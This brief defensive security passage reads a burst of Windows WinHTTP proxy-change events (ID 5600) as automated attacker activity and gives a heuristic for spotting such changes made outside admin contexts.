Ten successive 5600 events in one session is automation — the attacker is iterating proxy settings (likely toggling between proxy-on/proxy-off / changing proxy host as they relocate) rather than making a one-shot legitimate change.
Detection: any 5600 from a non-admin context is anomalous; legitimate WinHTTP proxy changes are made by admins via `netsh winhttp set proxy`, GPO, or the registry, and should be infrequent.
